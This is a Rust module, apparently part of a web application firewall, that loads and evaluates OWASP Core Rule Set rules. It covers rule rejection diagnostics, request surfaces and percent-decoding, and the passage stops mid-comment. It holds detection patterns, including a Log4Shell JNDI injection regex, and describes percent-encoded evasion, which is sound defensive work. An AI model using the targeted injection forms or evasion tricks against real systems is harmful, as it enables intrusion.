//! OWASP Core Rule Set (CRS) — native Rust implementation.
//!
//! Rules are loaded at runtime from the `rules/owasp-crs/` directory (YAML
//! files).  If the directory cannot be found, a minimal embedded rule set is
//! used as a fallback.
//!
//! Each rule has a `paranoia` level (1–4).  Only rules with
//! `paranoia <= defense_config.owasp_paranoia` are evaluated.
//! Default paranoia level is 1 (most permissive).
//!
//! # No silent failures
//!
//! A rule that cannot be evaluated by this engine is **never** loaded.  Both
//! the `field` and the `operator` are resolved to a concrete, implemented
//! matcher at load time; anything unresolvable is recorded in
//! [`LoadSummary`] and reported at `WARN` level on startup, and is excluded
//! from [`OWASPCheck::rule_count`].  Source-level failures (unreadable
//! directory, malformed YAML) are reported at `ERROR` level and recorded in
//! [`LoadSummary::source_errors`] — they never degrade silently into an empty
//! rule set.

use std::borrow::Cow;
use std::collections::{BTreeMap, HashMap};
use std::ffi::OsStr;
use std::fmt;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use regex::Regex;
use serde::Deserialize;
use tracing::{debug, error, info, warn};

use waf_common::{DetectionResult, Phase, RequestCtx};

use super::{Check, url_decode, url_decode_recursive};

/// Default on-disk location of the converted CRS rule set.
const DEFAULT_RULES_DIR: &str = "rules/owasp-crs";

/// Sub-directory of the rule set holding `pm_from_file` wordlists.
const DATA_SUBDIR: &str = "data";

/// Origin label used when rules come from an in-memory YAML string.
const INLINE_ORIGIN: &str = "<inline yaml>";

/// Origin label for the compiled-in fallback rule set.
const EMBEDDED_ORIGIN: &str = "<embedded fallback>";

// ── Minimal embedded fallback rules ──────────────────────────────────────────
// Used when the rules/owasp-crs/ directory cannot be found at runtime.

const EMBEDDED_RULES_YAML: &str = r#"
version: "1.0"
paranoia_level: 1
rules:
  - id: BUILTIN-911100
    name: Method is not allowed by policy
    category: protocol
    severity: critical
    paranoia: 1
    field: method
    operator: not_in
    value:
      - GET
      - POST
      - PUT
      - DELETE
      - PATCH
      - HEAD
      - OPTIONS
      - CONNECT
      - TRACE
    action: block

  - id: BUILTIN-920160
    name: Request body too large (>10 MB)
    category: protocol
    severity: critical
    paranoia: 1
    field: content_length
    operator: gt
    value: 10485760
    action: block

  - id: BUILTIN-944150
    name: 'Potential RCE: Log4j / Log4shell JNDI injection'
    category: java-injection
    severity: critical
    paranoia: 1
    field: all
    operator: regex
    value: '(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)'
    action: block
"#;

// ── YAML schema ───────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct RuleSet {
    #[allow(dead_code)]
    #[serde(default)]
    version: String,
    #[allow(dead_code)]
    #[serde(default = "default_paranoia_level")]
    paranoia_level: u8,
    rules: Vec<YamlRule>,
}

const fn default_paranoia_level() -> u8 {
    1
}

#[derive(Debug, Deserialize)]
struct YamlRule {
    id: String,
    name: String,
    #[allow(dead_code)]
    #[serde(default)]
    category: String,
    #[allow(dead_code)]
    #[serde(default)]
    severity: String,
    paranoia: u8,
    field: String,
    operator: String,
    value: YamlValue,
    /// `!@op` in `ModSecurity`: the condition holds for a value the matcher
    /// does *not* accept.
    #[serde(default)]
    negate: bool,
    /// `capture` in `ModSecurity`: bind this condition's regex groups to
    /// `tx:0`..`tx:9` for the conditions that follow.
    #[serde(default)]
    capture: bool,
    /// Extra conditions that must *all* hold, in order, for the rule to fire
    /// (`ModSecurity` `chain`).  Empty for an ordinary single-condition rule,
    /// which keeps every pre-chain rule file valid unchanged.
    #[serde(default)]
    chain: Vec<YamlCondition>,
    action: String,
}

/// One link of a chained rule.  Same shape as the head condition minus the
/// rule-level metadata, so `field` / `operator` / `value` mean exactly what
/// they mean at the top level.
#[derive(Debug, Deserialize)]
struct YamlCondition {
    field: String,
    operator: String,
    #[serde(default)]
    value: YamlValue,
    #[serde(default)]
    negate: bool,
    #[serde(default)]
    capture: bool,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum YamlValue {
    Str(String),
    List(Vec<String>),
    Int(i64),
}

impl Default for YamlValue {
    fn default() -> Self {
        Self::Str(String::new())
    }
}

// ── Load diagnostics ──────────────────────────────────────────────────────────

/// Coarse category of a rule rejection, used to aggregate startup diagnostics
/// and to reconcile "declared" against "enforced" rule counts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RejectCategory {
    /// The rule's `field` names a request location this engine cannot read.
    UnsupportedField,
    /// The rule's `operator` is not implemented by this engine.
    UnsupportedOperator,
    /// Field and operator are individually supported but their combination is
    /// not representable (a scalar comparison against a multi-valued
    /// collection).
    FieldOperatorMismatch,
    /// The rule's `value` has the wrong YAML type, is an invalid regex, or
    /// yields an empty pattern set.
    InvalidValue,
    /// A `pm_from_file` wordlist could not be located, read, or compiled.
    DataFile,
    /// A chained (`ModSecurity` `chain`) condition is not representable.
    Chain,
}

impl fmt::Display for RejectCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::UnsupportedField => "unsupported-field",
            Self::UnsupportedOperator => "unsupported-operator",
            Self::FieldOperatorMismatch => "field-operator-mismatch",
            Self::InvalidValue => "invalid-value",
            Self::DataFile => "data-file",
            Self::Chain => "chain-condition",
        };
        f.write_str(s)
    }
}

/// Why a rule present in the source YAML was **not** compiled into an active
/// matcher.  Rejected rules are excluded from [`OWASPCheck::rule_count`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RejectReason {
    /// `field` is not one of the implemented request locations.
    UnsupportedField(String),
    /// `operator` is not one of the implemented matchers.
    UnsupportedOperator(String),
    /// A scalar operator (`equals` / `not_in` / `gt` / `lt`) was applied to a
    /// multi-valued field (`all` / `headers` / `cookies`).
    NonScalarField {
        /// The scalar operator that was requested.
        operator: String,
        /// The multi-valued field it was applied to.
        field: String,
    },
    /// `value` has the wrong YAML type for the operator.
    InvalidValueType {
        /// The operator that rejected the value.
        operator: String,
        /// Human-readable description of the expected YAML type.
        expected: &'static str,
    },
    /// `value` did not compile as a regular expression.
    InvalidRegex(String),
    /// The multi-pattern set derived from `value` is empty or would not build.
    PatternSet(String),
    /// A `pm_from_file` wordlist could not be loaded.
    DataFile {
        /// The wordlist file name as written in the rule.
        file: String,
        /// Underlying failure description.
        error: String,
    },
    /// A chained condition could not be compiled.  The whole rule is dropped:
    /// enforcing only the conditions that *did* compile would be a strictly
    /// broader rule than the one the source declares, which is how a chained
    /// CRS rule turns into a false-positive generator.
    Chain {
        /// Which link failed, e.g. `chain[1]`.
        position: String,
        /// Rendered inner reason.
        detail: String,
    },
    /// `capture` was requested on a condition whose operator produces no
    /// capture groups, so the `tx:N` bindings it promises would never exist.
    CaptureWithoutRegex {
        /// Which condition asked for it.
        position: String,
    },
    /// A condition reads `tx:N` (or expands `%{TX.N}`) that no preceding
    /// condition captures, so it can never match.
    UnresolvedCapture {
        /// Which condition reads it.
        position: String,
        /// The capture index that is not bound.
        index: u8,
    },
}

impl RejectReason {
    /// Coarse category used for aggregation and reporting.
    #[must_use]
    pub const fn category(&self) -> RejectCategory {
        match self {
            Self::UnsupportedField(_) => RejectCategory::UnsupportedField,
            Self::UnsupportedOperator(_) => RejectCategory::UnsupportedOperator,
            Self::NonScalarField { .. } => RejectCategory::FieldOperatorMismatch,
            Self::InvalidValueType { .. } | Self::InvalidRegex(_) | Self::PatternSet(_) => RejectCategory::InvalidValue,
            Self::DataFile { .. } => RejectCategory::DataFile,
            Self::Chain { .. } | Self::CaptureWithoutRegex { .. } | Self::UnresolvedCapture { .. } => {
                RejectCategory::Chain
            }
        }
    }
}

impl fmt::Display for RejectReason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedField(field) => {
                write!(f, "unsupported field '{field}' (no accessor implemented)")
            }
            Self::UnsupportedOperator(op) => {
                write!(f, "unsupported operator '{op}' (no matcher implemented)")
            }
            Self::NonScalarField { operator, field } => write!(
                f,
                "operator '{operator}' needs a single-valued field but '{field}' is a collection"
            ),
            Self::InvalidValueType { operator, expected } => {
                write!(f, "operator '{operator}' requires a {expected} value")
            }
            Self::InvalidRegex(err) => write!(f, "invalid regex: {err}"),
            Self::PatternSet(err) => write!(f, "unusable pattern set: {err}"),
            Self::DataFile { file, error } => {
                write!(f, "wordlist '{file}' unavailable: {error}")
            }
            Self::Chain { position, detail } => write!(f, "{position}: {detail}"),
            Self::CaptureWithoutRegex { position } => {
                write!(f, "{position}: 'capture' needs a regex operator")
            }
            Self::UnresolvedCapture { position, index } => {
                write!(f, "{position}: reads tx:{index}, which no earlier condition captures")
            }
        }
    }
}

/// A rule that was declared in the source but is **not** enforced.
#[derive(Debug, Clone)]
pub struct RejectedRule {
    /// The rule's `id` field.
    pub rule_id: String,
    /// The file (or `<inline yaml>`) the rule was declared in.
    pub source: String,
    /// Why it was rejected.
    pub reason: RejectReason,
}

/// A whole rule source that could not be read or parsed.  Every rule it
/// declared is missing from the active set.
#[derive(Debug, Clone)]
pub struct SourceError {
    /// Path (or label) of the source.
    pub source: String,
    /// Underlying failure description.
    pub error: String,
}

/// Machine-readable account of a rule-set load.
///
/// This is the reconciliation basis for external conformance runs (`go-ftw`):
/// `attempted == compiled + rejected.len()` always holds for the sources that
/// parsed, and `source_errors` lists the sources whose rule count is unknown
/// because they never parsed.
#[derive(Debug, Clone, Default)]
pub struct LoadSummary {
    /// Rules successfully deserialised from all readable sources.
    pub attempted: usize,
    /// Rules that compiled into an enforceable matcher.
    pub compiled: usize,
    /// Rules that were declared but are not enforced, with the reason.
    pub rejected: Vec<RejectedRule>,
    /// Sources that failed to read/parse (their rules are entirely absent).
    pub source_errors: Vec<SourceError>,
    /// `true` when the minimal compiled-in rule set was used instead of the
    /// on-disk CRS.
    pub used_embedded_fallback: bool,
}

impl LoadSummary {
    /// Number of rejected rules in `category`.
    #[must_use]
    pub fn count(&self, category: RejectCategory) -> usize {
        self.rejected.iter().filter(|r| r.reason.category() == category).count()
    }

    /// Rule ids rejected in `category`, in declaration order.
    #[must_use]
    pub fn rule_ids(&self, category: RejectCategory) -> Vec<&str> {
        self.rejected
            .iter()
            .filter(|r| r.reason.category() == category)
            .map(|r| r.rule_id.as_str())
            .collect()
    }

    /// Rules dropped because their `field` is not implemented.
    #[must_use]
    pub fn rejected_field_count(&self) -> usize {
        self.count(RejectCategory::UnsupportedField)
    }

    /// Ids of the rules dropped because their `field` is not implemented.
    #[must_use]
    pub fn rejected_field_ids(&self) -> Vec<&str> {
        self.rule_ids(RejectCategory::UnsupportedField)
    }

    /// Rules dropped because their `operator` is not implemented.
    #[must_use]
    pub fn rejected_operator_count(&self) -> usize {
        self.count(RejectCategory::UnsupportedOperator)
    }

    /// Ids of the rules dropped because their `operator` is not implemented.
    #[must_use]
    pub fn rejected_operator_ids(&self) -> Vec<&str> {
        self.rule_ids(RejectCategory::UnsupportedOperator)
    }

    /// `true` when the active rule set is smaller than what the sources
    /// declared, or a source failed outright, or the embedded fallback was
    /// substituted.  Operators should treat this as "CRS coverage is not what
    /// the configuration implies".
    #[must_use]
    pub const fn is_degraded(&self) -> bool {
        !self.rejected.is_empty() || !self.source_errors.is_empty() || self.used_embedded_fallback
    }

    /// Emit the startup diagnostics for this load.
    ///
    /// Source failures are `ERROR` (a whole file's rules vanished); rejected
    /// rules are `WARN`, aggregated by reason with the full id list so an
    /// operator can see at a glance which rules are *declared but not
    /// enforced*.  A clean load logs a single `INFO` line.
    fn report(&self, origin: &str) {
        for err in &self.source_errors {
            error!(
                "OWASP CRS source '{}' failed to load ({}) — every rule it declares is NOT enforced",
                err.source, err.error
            );
        }

        if self.rejected.is_empty() {
            if self.source_errors.is_empty() {
                info!("OWASP CRS loaded {} rules from {origin}", self.compiled);
            } else {
                error!(
                    "OWASP CRS loaded {} rules from {origin} with {} unreadable source(s)",
                    self.compiled,
                    self.source_errors.len()
                );
            }
            return;
        }

        warn!(
            "OWASP CRS load summary for {origin}: {} of {} declared rules are ACTIVE — {} rejected \
             ({} unsupported-field, {} unsupported-operator, {} field-operator-mismatch, \
             {} invalid-value, {} data-file, {} chain-condition), {} unreadable source(s). \
             Rejected rules are NOT enforced.",
            self.compiled,
            self.attempted,
            self.rejected.len(),
            self.count(RejectCategory::UnsupportedField),
            self.count(RejectCategory::UnsupportedOperator),
            self.count(RejectCategory::FieldOperatorMismatch),
            self.count(RejectCategory::InvalidValue),
            self.count(RejectCategory::DataFile),
            self.count(RejectCategory::Chain),
            self.source_errors.len(),
        );

        // Aggregate by (category, rendered reason) so identical causes collapse
        // into one line carrying every affected rule id.
        let mut groups: BTreeMap<(RejectCategory, String), Vec<&str>> = BTreeMap::new();
        for rejected in &self.rejected {
            groups
                .entry((rejected.reason.category(), rejected.reason.to_string()))
                .or_default()
                .push(rejected.rule_id.as_str());
        }
        for ((category, reason), ids) in groups {
            warn!(
                "OWASP CRS [{category}] {} rule(s) NOT enforced — {reason}: {}",
                ids.len(),
                ids.join(", ")
            );
        }
    }
}

// ── Request fields ────────────────────────────────────────────────────────────

/// The set of request surfaces a multi-variable CRS rule scans.
///
/// CRS rules routinely name several `ModSecurity` variables at once
/// (`REQUEST_COOKIES|ARGS_NAMES|ARGS|XML:/*`).  The engine has no union
/// operator over the single-surface fields, and collapsing every such rule
/// onto one catch-all field is what produced this check's worst false
/// positives: a rule that reads cookies and arguments would also be run
/// against every request header value, and CRS patterns are not written with
/// that in mind.  Two live examples from the shipped set:
///
/// * CRS-933150 matches the PHP function name `urlencode`, which is a
///   substring of `Content-Type: application/x-www-form-urlencoded` — every
///   ordinary HTML form POST.
/// * CRS-941130 matches `xhtml`, which is a substring of the `Accept` header
///   every browser sends.
///
/// So the surfaces are carried explicitly and only the ones the upstream rule
/// asked for are walked.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Surfaces(u8);

impl Surfaces {
    const PATH: u8 = 1 << 0;
    const QUERY: u8 = 1 << 1;
    const BODY: u8 = 1 << 2;
    const COOKIES: u8 = 1 << 3;
    /// Every request header **value**.  Header *names* are only scanned by
    /// [`Field::Headers`], whose upstream (`REQUEST_HEADERS_NAMES`) asks for
    /// them explicitly.
    const HEADER_VALUES: u8 = 1 << 4;
    const USER_AGENT: u8 = 1 << 5;
    const REFERER: u8 = 1 << 6;

    /// Canonical order — also the order surface names appear in a field name.
    const NAMED: [(&'static str, u8); 7] = [
        ("path", Self::PATH),
        ("query", Self::QUERY),
        ("body", Self::BODY),
        ("cookies", Self::COOKIES),
        ("headers", Self::HEADER_VALUES),
        ("user_agent", Self::USER_AGENT),
        ("referer", Self::REFERER),
    ];

    /// What the bare field name `all` means: the whole request.
    const ALL: Self = Self(Self::PATH | Self::QUERY | Self::BODY | Self::COOKIES | Self::HEADER_VALUES);

    const fn has(self, bit: u8) -> bool {
        self.0 & bit != 0
    }

    /// Parse a `+`-joined surface list (`"query+body+cookies"`).
    ///
    /// Returns `None` for an unknown surface name or a duplicate, so a typo in
    /// a rule file is rejected at load time instead of quietly scanning less
    /// than the rule says.
    fn parse(name: &str) -> Option<Self> {
        let mut bits = 0u8;
        for token in name.split('+') {
            let (_, bit) = Self::NAMED.iter().find(|(n, _)| *n == token)?;
            if bits & bit != 0 {
                return None;
            }
            bits |= bit;
        }
        (bits != 0).then_some(Self(bits))
    }
}

/// A request location a CRS rule can be evaluated against.
///
/// Every variant is backed by a real accessor, so a rule that compiles is
/// guaranteed to be evaluable.  Unknown names are rejected at load time
/// ([`RejectReason::UnsupportedField`]) rather than silently never matching.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Field {
    /// Several request surfaces at once; `all` is the full set.
    Multi(Surfaces),
    Method,
    Path,
    Query,
    /// Request body preview (lossy UTF-8).
    Body,
    ContentLength,
    ContentType,
    UserAgent,
    PathLength,
    QueryArgCount,
    /// Every request header — names *and* values.
    ///
    /// This deliberately differs from [`super::SCANNED_HEADERS`], the curated
    /// 7-header list used by the heuristic SQLi/XSS/RCE checks to bound false
    /// positives.  CRS `headers` rules derive from
    /// `REQUEST_HEADERS_NAMES|REQUEST_HEADERS`, whose semantics are "all
    /// headers"; narrowing them to the curated list would silently weaken the
    /// rule (e.g. CRS-921140 header-injection detection).
    Headers,
    /// Each individual cookie **value** (CRS `REQUEST_COOKIES`).
    ///
    /// Split per-cookie rather than matching the whole `Cookie` header,
    /// because CRS cookie rules count characters *within one cookie value*;
    /// running them over the concatenated header would fire on any request
    /// carrying several ordinary cookies.
    Cookies,
    HeaderReferer,
    HeaderHost,
    HeaderRange,
    /// `&REQUEST_HEADERS:<name>` — how many times the header occurs.
    ///
    /// The engine folds repeated headers into a map, so the only values this
    /// can ever produce are `0` and `1`; that is enough for the
    /// presence/absence tests CRS chains on (`&REQUEST_HEADERS:Referer @eq 0`
    /// in CRS-943120) and not enough for anything else, which
    /// [`Loader::compile_condition`] rejects rather than silently never
    /// matching.
    HeaderCount(&'static str),
}

/// Headers `count_header_<name>` may name.
///
/// Restricted to the headers [`Field`] can already read, so the countable set
/// and the readable set stay the same inventory.  Underscores in the field
/// name stand for hyphens.
const COUNTABLE_HEADERS: [&str; 6] = [
    "content-type",
    "content-length",
    "user-agent",
    "referer",
    "host",
    "range",
];

impl Field {
    fn parse(name: &str) -> Option<Self> {
        if let Some(header) = name.strip_prefix("count_header_") {
            let wanted = header.replace('_', "-");
            let known = COUNTABLE_HEADERS.iter().find(|h| **h == wanted)?;
            return Some(Self::HeaderCount(known));
        }
        Some(match name {
            "all" => Self::Multi(Surfaces::ALL),
            "method" => Self::Method,
            "path" => Self::Path,
            "query" => Self::Query,
            "body" => Self::Body,
            "content_length" => Self::ContentLength,
            "content_type" | "header_content_type" => Self::ContentType,
            "user_agent" | "header_user_agent" => Self::UserAgent,
            "path_length" => Self::PathLength,
            "query_arg_count" => Self::QueryArgCount,
            "headers" => Self::Headers,
            "cookies" => Self::Cookies,
            "header_referer" => Self::HeaderReferer,
            "header_host" => Self::HeaderHost,
            "header_range" => Self::HeaderRange,
            // Composite surface list, e.g. `query+body+cookies`.  Requires a
            // `+` so a single-surface rule keeps using its dedicated field and
            // there is exactly one spelling per meaning.
            multi if multi.contains('+') => Self::Multi(Surfaces::parse(multi)?),
            _ => return None,
        })
    }

    /// `false` for fields that expand to several values; scalar comparisons
    /// (`equals` / `not_in` / `gt` / `lt`) are not meaningful on those.
    const fn is_scalar(self) -> bool {
        !matches!(self, Self::Multi(_) | Self::Headers | Self::Cookies)
    }

    /// Whether this field's value reaches a rule percent-decoded upstream.
    ///
    /// Only meaningful for the scalar variants; composite fields decide per
    /// surface in [`Self::any_value`] / [`Self::collect_values`].
    const fn scalar_decoding(self) -> Decoding {
        match self {
            // ModSecurity normalises and percent-decodes the URI before
            // exposing it (`REQUEST_FILENAME` / `REQUEST_URI`), and parses
            // `ARGS` / `REQUEST_BODY` out of the escaped forms.
            Self::Path | Self::Query | Self::Body => Decoding::Escaped,
            // `REQUEST_HEADERS` is handed to rules exactly as received, and so
            // are the engine-synthesised integers.
            Self::Method
            | Self::ContentLength
            | Self::ContentType
            | Self::UserAgent
            | Self::PathLength
            | Self::QueryArgCount
            | Self::HeaderReferer
            | Self::HeaderHost
            | Self::HeaderRange
            | Self::HeaderCount(_)
            // Unreachable for the multi-valued variants, which never route
            // through `scalar`; `Verbatim` is the conservative answer.
            | Self::Multi(_)
            | Self::Headers
            | Self::Cookies => Decoding::Verbatim,
        }
    }

    /// The single value of a scalar field, or `None` for multi-valued fields
    /// and for scalar fields absent from the request.
    fn scalar(self, ctx: &RequestCtx) -> Option<Cow<'_, str>> {
        let header = |name: &str| ctx.headers.get(name).map(|v| Cow::Borrowed(v.as_str()));
        match self {
            Self::Method => Some(Cow::Borrowed(ctx.method.as_str())),
            Self::Path => Some(Cow::Borrowed(ctx.path.as_str())),
            Self::Query => Some(Cow::Borrowed(ctx.query.as_str())),
            Self::Body => Some(String::from_utf8_lossy(&ctx.body_preview)),
            Self::ContentLength => Some(Cow::Owned(ctx.content_length.to_string())),
            Self::ContentType => header("content-type"),
            Self::UserAgent => header("user-agent"),
            Self::HeaderReferer => header("referer"),
            // The raw `Host` request header, *not* the matched vhost name —
            // CRS-920350 exists precisely to flag a Host header the site
            // configuration would not have produced.
            Self::HeaderHost => header("host"),
            Self::HeaderRange => header("range"),
            Self::PathLength => Some(Cow::Owned(ctx.path.len().to_string())),
            Self::QueryArgCount => {
                let count = ctx.query.split('&').filter(|s| !s.is_empty()).count();
                Some(Cow::Owned(count.to_string()))
            }
            Self::HeaderCount(name) => Some(Cow::Borrowed(if ctx.headers.contains_key(name) { "1" } else { "0" })),
            Self::Multi(_) | Self::Headers | Self::Cookies => None,
        }
    }

    /// Every value this field expands to, materialised.
    ///
    /// Only chained rules need this: a single-condition rule is answered by
    /// [`Self::any_value`], which short-circuits and allocates nothing.  A
    /// chain has to know *which* values matched so that a later
    /// `matched_value` (`ModSecurity` `MATCHED_VARS`) condition can be applied
    /// to them, so the whole expansion is collected — but only after the head
    /// condition has already matched, so this never runs on ordinary traffic.
    fn collect_values<'a>(self, ctx: &'a RequestCtx) -> Vec<(Cow<'a, str>, Decoding)> {
        let escaped = Decoding::Escaped;
        let verbatim = Decoding::Verbatim;
        match self {
            Self::Multi(s) => {
                let mut out: Vec<(Cow<'a, str>, Decoding)> = Vec::new();
                let header = |name: &str, out: &mut Vec<(Cow<'a, str>, Decoding)>| {
                    if let Some(value) = ctx.headers.get(name) {
                        out.push((Cow::Borrowed(value.as_str()), verbatim));
                    }
                };
                if s.has(Surfaces::PATH) {
                    out.push((Cow::Borrowed(ctx.path.as_str()), escaped));
                }
                if s.has(Surfaces::QUERY) {
                    out.push((Cow::Borrowed(ctx.query.as_str()), escaped));
                }
                if s.has(Surfaces::BODY) {
                    out.push((String::from_utf8_lossy(&ctx.body_preview), escaped));
                }
                if s.has(Surfaces::COOKIES) {
                    out.extend(cookie_values(ctx).map(|v| (Cow::Borrowed(v), escaped)));
                }
                if s.has(Surfaces::HEADER_VALUES) {
                    out.extend(ctx.headers.values().map(|v| (Cow::Borrowed(v.as_str()), verbatim)));
                }
                if s.has(Surfaces::USER_AGENT) {
                    header("user-agent", &mut out);
                }
                if s.has(Surfaces::REFERER) {
                    header("referer", &mut out);
                }
                out
            }
            Self::Headers => ctx
                .headers
                .iter()
                .flat_map(|(name, value)| {
                    [
                        (Cow::Borrowed(name.as_str()), verbatim),
                        (Cow::Borrowed(value.as_str()), verbatim),
                    ]
                })
                .collect(),
            Self::Cookies => cookie_values(ctx).map(|v| (Cow::Borrowed(v), escaped)).collect(),
            _ => self
                .scalar(ctx)
                .map(|v| (v, self.scalar_decoding()))
                .into_iter()
                .collect(),
        }
    }

    /// Apply `f` to every value this field expands to, short-circuiting on the
    /// first `true`.
    ///
    /// `f` is told, per value, whether the surface it came from is one
    /// `ModSecurity` would have percent-decoded before a rule saw it.
    fn any_value(self, ctx: &RequestCtx, mut f: impl FnMut(&str, Decoding) -> bool) -> bool {
        let escaped = Decoding::Escaped;
        let verbatim = Decoding::Verbatim;
        match self {
            Self::Multi(s) => {
                let header = |name: &str, f: &mut dyn FnMut(&str, Decoding) -> bool| {
                    ctx.headers.get(name).is_some_and(|v| f(v, verbatim))
                };
                (s.has(Surfaces::PATH) && f(&ctx.path, escaped))
                    || (s.has(Surfaces::QUERY) && f(&ctx.query, escaped))
                    || (s.has(Surfaces::BODY) && f(&String::from_utf8_lossy(&ctx.body_preview), escaped))
                    || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(|v| f(v, escaped)))
                    || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| f(v, verbatim)))
                    || (s.has(Surfaces::USER_AGENT) && header("user-agent", &mut f))
                    || (s.has(Surfaces::REFERER) && header("referer", &mut f))
            }
            Self::Headers => ctx
                .headers
                .iter()
                .any(|(name, value)| f(name, verbatim) || f(value, verbatim)),
            Self::Cookies => cookie_values(ctx).any(|v| f(v, escaped)),
            _ => self
                .scalar(ctx)
                .as_deref()
                .is_some_and(|v| f(v, self.scalar_decoding())),
        }
    }
}

/// Individual cookie values from the folded `Cookie` header.
fn cookie_values(ctx: &RequestCtx) -> impl Iterator<Item = &str> + '_ {
    ctx.headers
        .get("cookie")
        .into_iter()
        .flat_map(|raw| raw.split(';'))
        .map(|pair| {
            let pair = pair.trim();
            pair.split_once('=').map_or(pair, |(_, value)| value)
        })
        .filter(|value| !value.is_empty())
}

/// Whether a value arrives at a rule percent-decoded upstream.
///
/// `ModSecurity` does not hand CRS the bytes off the wire.  `ARGS`,
/// `REQUEST_COOKIES` and the normalised `REQUEST_URI` / `REQUEST_FILENAME` are
/// percent-decoded by the parser before any rule runs, and most CRS rules for
/// those surfaces additionally carry `t:urlDecodeUni`; the patterns are written
/// accordingly.  `REQUEST_HEADERS` is the deliberate exception — a header value
/// is delivered to the origin exactly as sent, so CRS leaves it alone, and its
/// header rules are written against raw text.  Decoding a header anyway
/// manufactures false positives: CRS-932131 looks for the shell construct
/// `/name[index]`, which any ordinary `Referer` carrying `%5B0%5D` would
/// produce once decoded.
///
/// Carried alongside each value so one matcher can serve both kinds of surface
/// — a composite field such as `path+query+body+cookies+headers` mixes them.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Decoding {
    /// Percent-encoded surface: test the raw and decoded forms.
    Escaped,
    /// Verbatim surface: test exactly what was received.
    Verbatim,
}

/// `true` when percent-decoding `s` could possibly change it.
///
/// `%` starts an escape and `+` is the form-encoded space; a value holding
/// neither is its own decoded form, so the caller can skip the decode and the
/// allocation it needs.  This guard is what keeps ordinary unencoded traffic at
/// the cost it had before decoded matching existed.
///
/// It runs once per rule per escaped surface — hundreds of times per request —
/// so it scans a word at a time.  A plain `bytes().any(..)` loop measured
/// ~125 us on a 2 KB unencoded query string, more than the CRS regexes the
/// guard exists to skip.
fn may_be_encoded(s: &str) -> bool {
    /// `0x01` in every byte lane.
    const ONES: u64 = u64::from_ne_bytes([0x01; 8]);
    /// `0x80` in every byte lane.
    const HIGHS: u64 = u64::from_ne_bytes([0x80; 8]);
    const PERCENTS: u64 = u64::from_ne_bytes([b'%'; 8]);
    const PLUSES: u64 = u64::from_ne_bytes([b'+'; 8]);

    /// `true` when any byte lane of `word` is zero.
    ///
    /// Borrowing a `1` out of the lane above sets that lane's high bit exactly
    /// when the lane was zero; `& !word` discards lanes that were already
    /// >= 0x80 and merely borrowed.  Exact — no false positives.
    const fn has_zero_lane(word: u64) -> bool {
        word.wrapping_sub(ONES) & !word & HIGHS != 0
    }

    let bytes = s.as_bytes();
    let mut chunks = bytes.chunks_exact(8);
    for chunk in &mut chunks {
        let Ok(lanes) = <[u8; 8]>::try_from(chunk) else {
            // `chunks_exact(8)` yields nothing but 8-byte chunks; fall back to
            // the byte scan rather than assume it.
            return bytes.iter().any(|&b| b == b'%' || b == b'+');
        };
        let word = u64::from_ne_bytes(lanes);
        if has_zero_lane(word ^ PERCENTS) || has_zero_lane(word ^ PLUSES) {
            return true;
        }
    }
    chunks.remainder().iter().any(|&b| b == b'%' || b == b'+')
}

/// Apply `f` to `raw` and, on a [`Decoding::Escaped`] surface that looks
/// percent/plus-encoded, to its single- and recursively-decoded forms,
/// reporting *which* form matched.
///
/// `ModSecurity` hands CRS patterns an already-decoded value: `ARGS`,
/// `REQUEST_COOKIES` and `REQUEST_FILENAME` are percent-decoded by the parser
/// before a rule ever sees them, and most CRS rules additionally attach
/// `t:urlDecodeUni`.  A matcher that only inspected the raw bytes off the wire
/// would therefore be evaded by writing the payload percent-encoded, which is
/// the default way every HTTP client sends it anyway.
///
/// The matched form is reported rather than a bare `bool` because
/// `ModSecurity` `MATCHED_VARS` holds the *transformed* value: a follow-up
/// condition in a chain must see the decoded text the first condition actually
/// matched, not the raw bytes off the wire.
///
/// Generic rather than `&mut dyn FnMut` so the matcher — a regex step or a
/// single `str` comparison — inlines into the raw-value test that answers
/// almost every call.
fn matching_form<F: FnMut(&str) -> bool>(raw: &str, decoding: Decoding, mut f: F) -> Outcome {
    if f(raw) {
        return Outcome::Match(MatchForm::Same);
    }
    if decoding == Decoding::Verbatim || !may_be_encoded(raw) {
        return Outcome::NoMatch;
    }
    let decoded = url_decode(raw);
    if decoded != raw && f(&decoded) {
        return Outcome::Match(MatchForm::Transformed(decoded));
    }
    // A second pass can only differ when the first one left an escape behind,
    // which is what a double-encoded payload does and ordinary traffic does
    // not.  Checking that before recursing keeps the singly-encoded case — the
    // overwhelmingly common one — down to a single decode allocation.
    if !may_be_encoded(&decoded) {
        return Outcome::NoMatch;
    }
    let recursive = url_decode_recursive(raw);
    if recursive != decoded && f(&recursive) {
        return Outcome::Match(MatchForm::Transformed(recursive));
    }
    Outcome::NoMatch
}

// ── Operands ──────────────────────────────────────────────────────────────────

/// One piece of a `ModSecurity` operand after macro expansion.
#[derive(Debug)]
enum OperandPart {
    Lit(String),
    /// `%{TX.N}` — capture group `N` of the last capturing condition.
    Capture(u8),
    /// `%{REQUEST_HEADERS.HOST}` — the request's `Host` header.
    Host,
}

/// The right-hand side of a string comparison.
///
/// CRS chains compare a capture against another capture
/// (`SecRule TX:1 "@streq %{TX.2}"`, CRS-942130) or against a request header
/// (`SecRule TX:1 "!@endsWith %{request_headers.host}"`, CRS-943110).  Storing
/// the operand as parts keeps the overwhelmingly common literal case a single
/// borrow while making those two forms expressible instead of comparing
/// against the uninterpreted text `%{TX.2}`.
#[derive(Debug)]
struct Operand(Vec<OperandPart>);

impl Operand {
    /// Parse the CRS macro syntax.
    ///
    /// Returns `None` for a macro this engine cannot expand, so the rule is
